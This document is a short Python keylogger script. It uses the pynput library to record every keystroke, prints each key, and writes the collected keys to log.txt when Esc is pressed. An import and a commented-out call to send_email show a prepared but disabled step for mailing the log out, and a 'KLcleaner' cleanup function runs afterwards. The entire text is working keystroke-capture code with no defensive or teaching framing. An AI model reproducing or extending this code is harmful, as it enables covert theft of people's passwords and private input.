from pynput.keyboard import Key, Listener
from send_email import send_email
from KLcleaner import clean 
keys=[]
def on_press(key):
    keys.append(key)
    print(key)

def on_release(key):
    if key == Key.esc:
        with open('log.txt','w') as file:
            file.writelines(str(keys))
            #send_email()
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()


clean()
